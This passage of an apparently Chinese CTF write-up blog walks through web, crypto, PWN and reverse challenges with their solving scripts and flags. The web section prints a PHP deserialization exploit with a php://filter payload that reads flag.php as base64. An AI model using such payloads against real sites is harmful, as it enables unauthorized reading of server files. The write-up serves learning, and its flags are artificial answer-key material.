/>![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698570320937-5aaf9b76-4c23-448e-8783-c9301b570747.png#averageHue=%23191c25&clientId=u35de8186-3912-4&from=paste&height=555&id=u80fccc4e&originHeight=694&originWidth=1077&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=232444&status=done&style=none&taskId=u9886b518-4343-45ce-8ff5-511e95ede2d&title=&width=861.6)<br />**得到flag：**<br />`flag{aad7d04d-44b4-4696-b3e5-334d67a7374c}`
<a name="Z90gT"></a>
### [WEEK2]no_wake_up
题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698570649268-74096f48-ad3b-459f-a0de-b95bae19da49.png#averageHue=%23fcfbfb&clientId=u35de8186-3912-4&from=paste&height=301&id=u214b3994&originHeight=376&originWidth=705&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28004&status=done&style=none&taskId=u06df629a-c1bb-4ff0-bb26-637e89290d4&title=&width=564)
```php
<?php
highlight_file(__FILE__);
class flag{
public $username;
public $code;
public function __wakeup(){
$this->username = "guest";
}
public function __destruct(){
if($this->username = "admin"){
include($this->code);
}
}
}
unserialize($_GET['try']);
```
**exp:**
```php
<?php
  class flag
{
  public $username = "admin";
public $code = "php://filter/read=convert.base64-encode/resource=flag.php";
}
$l=new flag();
echo serialize($l);
```
运行结果：<br />`O:4:"flag":2:{s:8:"username";s:5:"admin";s:4:"code";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}`<br />上传payload<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698571020085-3b713f6b-3e99-4903-ae8b-dabede3dec60.png#averageHue=%23fbfaf9&clientId=u35de8186-3912-4&from=paste&height=310&id=u154ab0a2&originHeight=388&originWidth=1273&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48764&status=done&style=none&taskId=u08e936de-eb3e-4a0c-ae74-623bc296801&title=&width=1018.4)<br />base64编码<br />`PD9waHANCiRmbGFnID0gImZsYWd7MTE5NmY2NzQtZjkwMi00YWEzLWI5M2MtNTUyYTgxNTUzMjlkfSI7`<br />base64解码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698571148414-d80a5028-8116-493e-bad3-35aee8745023.png#averageHue=%23191b25&clientId=u35de8186-3912-4&from=paste&height=568&id=ud689292a&originHeight=710&originWidth=1459&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=306871&status=done&style=none&taskId=u349dd91a-de37-4e51-a066-1f0cb329c3f&title=&width=1167.2)<br />**得出flag：**<br />`flag{1196f674-f902-4aa3-b93c-552a8155329d}`
<a name="HZXFk"></a>
## Crypto
<a name="oqXHe"></a>
### [WEEK1]立正
下载题目并打开<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698571642801-a6bb221c-87ad-4e96-9c07-5725499e4a31.png#averageHue=%23fafafa&clientId=u35de8186-3912-4&from=paste&height=821&id=u4046c9cf&originHeight=1026&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=126893&status=done&style=none&taskId=u95af9027-1ee0-4aa0-a502-fb02e86ec16&title=&width=1536)<br />`wl hgrfhg 4gNUx4NgQgEUb4NC64NHxZLg636V6CDBiDNUHw8HkapH :jdoi vl vlkw  ~xrb wd nrrT Y:`<br />一把梭：<br />![c7efdde8434f3ca711ce7d929b939cb.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698571771397-423d3f63-5dc7-4676-91b7-dc41dd318bd7.png#averageHue=%23dfeed9&clientId=u35de8186-3912-4&from=paste&height=818&id=uf372600d&originHeight=1022&originWidth=1900&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=552026&status=done&style=none&taskId=uee8f58e3-84cb-47fa-9e74-12b694f1b44&title=&width=1520)<br />**得到flag：**<br />`flag{Y0U_MU57_5t4nd_uP_r1gHt_n0W}`
<a name="H6hOq"></a>
### [WEEK1]Crypto_Checkin
下载题目并打开<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698571942686-f0eab398-9874-4e94-9af2-cfac259abd46.png#averageHue=%23fafafa&clientId=u35de8186-3912-4&from=paste&height=862&id=u5977ceaf&originHeight=1077&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140818&status=done&style=none&taskId=uc6e87f6d-e020-4552-99bb-7d7f0b0310d&title=&width=1536)<br />`QZZ|KQbjRRS8QZRQdCYwR4_DoQ7~jyO>0t4R4__aQZQ9|Rz+k_Q!r#mR90+NR4_4NR%>ipO>0s{R90|SQhHKhRz+k^S8Q5JS5|OUQZO}CQfp*dS8P&9R8>k?QZYthRz+k_O>0#>`<br />base85(b)解码:		<br />`R1kzRE1RWldHRTNET04yQ0dVMkRNT0JUR0UzVEdOS0dHTVlUT01aVklZMkRFTVpVRzRaVEdNWlZJWVpUR05TRkdZWlRHTUJXR1FaVEdOMkU=`<br />Base16-32-64-91混合多重解码:<br />base64<br />`R1kzRE1RWldHRTNET04yQ0dVMkRNT0JUR0UzVEdOS0dHTVlUT01aVklZMkRFTVpVRzRaVEdNWlZJWVpUR05TRkdZWlRHTUJXR1FaVEdOMkU=`<br />base32<br />`GY3DMQZWGE3DON2CGU2DMOBTGE3TGNKGGMYTOMZVIY2DEMZUG4ZTGMZVIYZTGNSFGYZTGMBWGQZTGN2E`<br />base16<br />`666C61677B546831735F31735F423473335F336E633064337D`<br />三种base混合解码<br />**得出flag：**<br />`flag{Th1s_1s_B4s3_3nc0d3}`
<a name="gWwMt"></a>
### [WEEK1]残缺的md5
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698573685817-fe49b15e-28ea-456c-ae8f-4f719658c3e3.png#averageHue=%23fcfbfb&clientId=u35de8186-3912-4&from=paste&height=636&id=u8dea5a57&originHeight=795&originWidth=1403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32717&status=done&style=none&taskId=u2c985150-593c-4dc6-badd-b5050e16c27&title=&width=1122.4)<br />使用python写脚本：
```python
import itertools
import string
import hashlib
def generate_strings():
    characters = "QWERTYUIOPLKJHGFDSAZXCVBNM012345689"
    for _ in itertools.product(characters, repeat=1):
        yield ''.join(_)
# 输入的固定部分
a = 'KCLWG'
b = 'K8M9O3'
c = 'DE'
e = '84S9'
# 计算目标MD5哈希值
target_md5_suffix = "b2ac4e6"
for part1 in generate_strings():
    for part2 in generate_strings():
        for part3 in generate_strings():
            str_to_hash = a + part1 + b + part2 + c + part3 + e
            # 计算new_string的MD5哈希值
            md5_hash = hashlib.md5(str_to_hash.encode()).hexdigest()
            # 检查MD5哈希值的后七位是否与目标匹配
            if md5_hash[-7:] == target_md5_suffix:
                print("MD5加密前为:", str_to_hash)
                print("MD5加密后为:", md5_hash)
```
运行结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698573874557-b6fb210d-3143-4962-bb37-a23d87440e46.png#averageHue=%232e2f27&clientId=u35de8186-3912-4&from=paste&height=219&id=ue46a6170&originHeight=274&originWidth=641&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17206&status=done&style=none&taskId=u7fd4831c-5c34-4ad6-b938-b4f606fc08e&title=&width=512.8)<br />写个python脚本转大写
```python
flag='f0af1443b1f463eafff7aebb8b2ac4e6'
print(flag.upper())
```
运行结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698574088692-b7033619-f476-4b21-a608-e0a15c0ee3b7.png#averageHue=%232b2c25&clientId=u35de8186-3912-4&from=paste&height=529&id=u683646b8&originHeight=661&originWidth=824&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27334&status=done&style=none&taskId=u23a90458-e8dd-466d-a531-16ca034f600&title=&width=659.2)<br />**得到flag：**<br />`flag{F0AF1443B1F463EAFFF7AEBB8B2AC4E6}`
<a name="cYVmq"></a>
### [WEEK1]凯撒大帝
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698574306579-e41f7a03-5668-49ec-a125-5e69805c2a84.png#averageHue=%23f9f8f8&clientId=u35de8186-3912-4&from=paste&height=110&id=u460d4664&originHeight=138&originWidth=655&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7933&status=done&style=none&taskId=u5c1363e7-0dfe-42bf-bec7-52dfe48c2f2&title=&width=524)<br />凯撒移位<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698574421945-6507b0ad-41b3-4d24-9457-a25b48e7b599.png#averageHue=%23f8f8f8&clientId=u35de8186-3912-4&from=paste&height=350&id=uacb88fe8&originHeight=437&originWidth=1102&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20574&status=done&style=none&taskId=u0a1b6051-8eb4-4c44-abfc-abbece80450&title=&width=881.6)<br />**得到flag：**<br />`flag{chutihaonan}`
<a name="O4e1m"></a>
### [WEEK1]进制
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698574537656-8ff894b5-3bbb-4d35-80d4-264655a330da.png#averageHue=%23f7f5f4&clientId=u35de8186-3912-4&from=paste&height=118&id=u81582a33&originHeight=148&originWidth=1014&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10879&status=done&style=none&taskId=ud3bf59a2-2443-4b65-973f-1964c1faeaa&title=&width=811.2)<br />16进制转字符串<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698574890218-8d42e43c-9f5f-4563-97ff-ce97d8aa400b.png#averageHue=%23fcfcfc&clientId=u35de8186-3912-4&from=paste&height=510&id=ue55f5fcb&originHeight=637&originWidth=1337&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43571&status=done&style=none&taskId=u3fdf2f00-94d8-4906-8641-448b37420c4&title=&width=1069.6)<br />哈希还原<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698574935585-1a25b238-311e-44e9-a6e8-37a6ca26eb76.png#averageHue=%23e8e8e8&clientId=u35de8186-3912-4&from=paste&height=490&id=u92a716bd&originHeight=612&originWidth=710&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=100578&status=done&style=none&taskId=ufee11879-84a1-4f3a-8c92-327e2df8534&title=&width=568)<br />**得到flag：**<br />`flag{ahfkjlhkah}`
<a name="Bl0Id"></a>
### [WEEK1]okk
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698575062166-44ac54d3-35ae-43ef-8be9-fa642b58c2a5.png#averageHue=%23ede9e7&clientId=u35de8186-3912-4&from=paste&height=566&id=ueba896b0&originHeight=707&originWidth=895&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31410&status=done&style=none&taskId=u3dd6c778-fe06-4f6f-a687-07a39e6d323&title=&width=716)<br />Ook编码转文本<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698575181660-ec0daf28-0dfe-4556-9b86-15bfc74fc243.png#averageHue=%23f2f2f2&clientId=u35de8186-3912-4&from=paste&height=238&id=uacfa111d&originHeight=297&originWidth=855&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12999&status=done&style=none&taskId=ua723bef1-114f-4298-9ff8-0e489623105&title=&width=684)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698575217315-b9b36f2d-0963-4b87-ae35-f0315d2c88ad.png#averageHue=%23f8f7f7&clientId=u35de8186-3912-4&from=paste&height=201&id=uc3f57713&originHeight=251&originWidth=740&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10746&status=done&style=none&taskId=u11c69cc1-ff5b-491c-a26a-6f4e6d9018b&title=&width=592)<br />**得到flag：**<br />`flag{123456789}`
<a name="aTAQ3"></a>
### [WEEK1]熊斐特
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698575347262-db29bc41-33ed-4dd4-ad31-06f3d2316b04.png#averageHue=%23f6f4f2&clientId=u35de8186-3912-4&from=paste&height=118&id=u76e4b524&originHeight=148&originWidth=453&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=9832&status=done&style=none&taskId=u7179757b-7bc1-42af-8c8b-67be2a6ef47&title=&width=362.4)<br />Atbash Cipher（埃特巴什码）转化<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698575477383-26acd252-a6d7-48af-9ae4-d6ca6599bba4.png#averageHue=%23fefefe&clientId=u35de8186-3912-4&from=paste&height=516&id=ua03f34c7&originHeight=645&originWidth=1397&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30331&status=done&style=none&taskId=u59e11562-597c-4f2c-831f-102c91de00b&title=&width=1117.6)<br />**得到flag：**<br />`flag{atbash cipher}`
<a name="wyGSL"></a>
### [WEEK1]黑暗之歌
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698575595769-eb962ad0-0b07-4838-ae98-d60213ca792f.png#averageHue=%23fefefe&clientId=u35de8186-3912-4&from=paste&height=574&id=u29586adb&originHeight=718&originWidth=1380&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8008&status=done&style=none&taskId=u4ae20495-e367-4b01-8c49-97154e7408d&title=&width=1104)<br />盲文解密<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698575688742-41fd0f5b-1ea0-4b03-b96a-fa56d4b70970.png#averageHue=%23fbfbfa&clientId=u35de8186-3912-4&from=paste&height=536&id=u234c2c6e&originHeight=670&originWidth=1581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69815&status=done&style=none&taskId=u046979cf-25db-4e5f-9f64-2a47c957887&title=&width=1264.8)<br />base64解密<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698575759444-47ab2aa0-c9c9-488f-9ec3-e853926694c0.png#averageHue=%231b1e26&clientId=u35de8186-3912-4&from=paste&height=169&id=u136f2342&originHeight=211&originWidth=1372&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=127749&status=done&style=none&taskId=u40e4aa5a-de71-4df0-80d8-d10890407c1&title=&width=1097.6)<br />音符解密<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698575833507-f333f9e3-91bc-41ea-ba2d-1284e206f38b.png#averageHue=%23fbfbfb&clientId=u35de8186-3912-4&from=paste&height=630&id=uc353c7c5&originHeight=787&originWidth=1421&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53100&status=done&style=none&taskId=u4501de45-b5d8-49d3-bd6f-8be008896d6&title=&width=1136.8)<br />**得出flag：**<br />`flag{b2cc-9091-8a29}`
<a name="wmTri"></a>
### [WEEK1]迷雾重重
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698575939948-25f7f8f8-0050-401f-823d-ae5c479e661a.png#averageHue=%23fbfbfa&clientId=u35de8186-3912-4&from=paste&height=230&id=ub96bc0bd&originHeight=288&originWidth=1220&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12121&status=done&style=none&taskId=u61bb6efc-580b-4fac-b424-b801c3076e2&title=&width=976)<br />二进制转摩斯密码<br />0为'.'1为'-'空格为'/'<br />`..-./.-../.-/--./----.--/--/---/.-./..././..--.-/../.../..--.-/...-/./.-./-.--/..--.-/..-./..-/-./-----.-`<br />摩斯密码解密<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698576154000-e3d33e98-d5de-40ea-ab26-d5d1b6e7e646.png#averageHue=%23fbfafa&clientId=u35de8186-3912-4&from=paste&height=452&id=ucccc5e0a&originHeight=565&originWidth=1254&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=68330&status=done&style=none&taskId=u47dceb4d-f1c6-4532-9e0f-7121f53d505&title=&width=1003.2)
> %u7b={
> %u7d=}

**得到flag：**<br />`FLAG{MORSE_IS_VERY_FUN}`
<a name="siiC4"></a>
### [WEEK1]难言的遗憾
下载题目并打开：![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698576507136-d8ba213c-a63c-49c0-96b6-6ffc6aec83f4.png#averageHue=%23faf9f8&clientId=u35de8186-3912-4&from=paste&height=258&id=u41aa4014&originHeight=323&originWidth=1064&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20662&status=done&style=none&taskId=u1facbb3a-5ae3-4563-959c-f4c3800e3ae&title=&width=851.2)<br />中文电码解密<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698576469945-1cc7e63a-afa1-4088-b78b-dffe316db0cb.png#averageHue=%23fbfafa&clientId=u35de8186-3912-4&from=paste&height=482&id=uedc0fea4&originHeight=602&originWidth=1398&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47308&status=done&style=none&taskId=uf65ca4cc-5303-4985-9253-479b39e0c71&title=&width=1118.4)<br />**得出flag：**<br />`flag{一天不学高数我就魂身难受}`
<a name="IIZ8N"></a>
### [WEEK1]小兔子可爱捏
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698576681348-cca02c4e-b7b1-4540-acca-ea710d80d705.png#averageHue=%23f9f8f7&clientId=u35de8186-3912-4&from=paste&height=258&id=ue36bf5f0&originHeight=323&originWidth=770&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19270&status=done&style=none&taskId=u78a287cb-7935-458d-8e17-41ac141b56f&title=&width=616)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698576714729-4b58d119-8030-4335-baac-f83a1f91d771.png#averageHue=%23f7f1ee&clientId=u35de8186-3912-4&from=paste&height=80&id=u943a3b53&originHeight=100&originWidth=728&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23130&status=done&style=none&taskId=u613832ee-6181-4f9c-909b-5a244b7bd5b&title=&width=582.4)<br />宇宙的终极答案是：42<br />Rabbit（兔子）解密<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698576984386-f021bd5b-1947-472f-9d41-72cf4b422ab7.png#averageHue=%23fdfdfd&clientId=u35de8186-3912-4&from=paste&height=365&id=ucf00baa6&originHeight=456&originWidth=1407&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32166&status=done&style=none&taskId=ud99aae61-d967-4a5d-8b60-df02b2a5362&title=&width=1125.6)<br />**得到flag：**<br />`flag{i_love_technology}`
<a name="mXiYE"></a>
### [WEEK1]what is m
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698577136304-25cbc13d-6bdb-492f-ab1a-4e2c2b8a0008.png#averageHue=%23fbfafa&clientId=u35de8186-3912-4&from=paste&height=666&id=ucf63d8e1&originHeight=832&originWidth=1403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26852&status=done&style=none&taskId=ubd459740-92a9-4e07-88e7-93aeb0183b1&title=&width=1122.4)<br />还原m即可<br />写个python脚本一把梭
```python
from Crypto.Util.number import long_to_bytes
m = 7130439814059477365465881592242189984174813803592711881640295679655301582414518361829827793806793804626699859619466410111590180160366476408654141662794502447303629472823901463632274384106877
flag=long_to_bytes(m)
print(flag)
#将m转为字节
```
运行结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698577466971-a423cf57-8902-4ae5-83cd-a8069abe271c.png#averageHue=%232a2b25&clientId=u35de8186-3912-4&from=paste&height=566&id=u5f64a723&originHeight=708&originWidth=1288&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52617&status=done&style=none&taskId=u0f9da249-6850-4d49-9469-696f812e1e8&title=&width=1030.4)<br />**得出flag：**<br />`flag{th3re_4r3_S3veral_aITErnA7lvES_70_tHE_L0N6_7O_8Y73S_1UNcTION_dg12dC49bTf5}`
<a name="gNzH1"></a>
## PWN
<a name="xhE6X"></a>
### [WEEK1]nc
nc连接<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698577692674-cc673a8e-d4bb-4658-bde2-f6b08354bc53.png#averageHue=%231c1f2c&clientId=u35de8186-3912-4&from=paste&height=408&id=u71bde00c&originHeight=510&originWidth=723&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=161144&status=done&style=none&taskId=uec55fd2c-eb27-4473-b082-97cb2843ecb&title=&width=578.4)<br />ls<br />cat flag<br />一把梭<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698577752373-290db706-abc0-4080-8f15-35e5099e39ca.png#averageHue=%231a1d25&clientId=u35de8186-3912-4&from=paste&height=536&id=udecac37b&originHeight=670&originWidth=986&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=208521&status=done&style=none&taskId=u13b2005f-4ea0-4768-9e18-7789b4f1e76&title=&width=788.8)<br />**得到flag：**<br />`flag{1dcc22cb-ae4d-4cb0-88f2-2e1461b1bb5c}`
<a name="RaQVH"></a>
### [WEEK1]hard nc
nc连接<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698577965351-7e641f78-7d78-41e0-ab6a-e5f75617fec6.png#averageHue=%231a1d25&clientId=u35de8186-3912-4&from=paste&height=541&id=u75d75d89&originHeight=676&originWidth=988&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=181364&status=done&style=none&taskId=uefa3b1f2-65da-4cf0-8638-e92e0b69984&title=&width=790.4)
> ls
> cat flag
> ls gift2
> cat gift2
> cd gift2
> ls 
> cat flag2

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698578242308-47a84e36-4bb1-43f1-9811-8b1924233e32.png#averageHue=%231a1d29&clientId=u35de8186-3912-4&from=paste&height=715&id=ud45d588e&originHeight=894&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=527445&status=done&style=none&taskId=u1ad9f759-e9f6-4b79-a6f3-e9aff175600&title=&width=1328.8)<br />base64编码<br />`OTMtYTg3ZC0zN2FjMDljMGU1Njl9Cg==`<br />base64解码<br />`93-a87d-37ac09c0e569}`<br />好家伙只给了一半flag，再找找上半部分
> ls -a查看隐藏目录文件
> cat .gift

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698578470979-1b14e2be-eeb2-4b45-b9fb-7f197be9f396.png#averageHue=%231a1c25&clientId=u35de8186-3912-4&from=paste&height=637&id=u9a45d18e&originHeight=796&originWidth=1194&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=300146&status=done&style=none&taskId=uf5ad16a9-ed6e-46bb-be97-c25b6eb4c56&title=&width=955.2)<br />flag前半部分<br />`flag{a284241c-5d85-46`<br />前后合并<br />**得出flag：**<br />`flag{a284241c-5d85-4693-a87d-37ac09c0e569}`
<a name="OGjKr"></a>
## Reverse
<a name="K3Ldj"></a>
### [WEEK1]signin
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698578828012-2f862219-4463-48aa-96a3-5bab8be856c6.png#averageHue=%23f6f8c6&clientId=u35de8186-3912-4&from=paste&height=198&id=u18858f91&originHeight=247&originWidth=1292&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93734&status=done&style=none&taskId=u0a6e2165-811b-4e05-a6fa-2ae7d314b8e&title=&width=1033.6)<br />可执行文件<br />放入IDA进行分析<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698578982055-5e2d6687-70dd-44a4-a50d-e140567a6dbd.png#averageHue=%23d6bd73&clientId=u35de8186-3912-4&from=paste&height=838&id=u8debdf28&originHeight=1047&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=142501&status=done&style=none&taskId=uea9aad59-8982-425c-bcbd-ba2918e25bf&title=&width=1536)<br />**得到flag：**<br />`flag{flag1sinarray}`

<br />

原文链接：https://blog.csdn.net/m0_73734159/article/details/134111972?spm=1001.2014.3001.5502

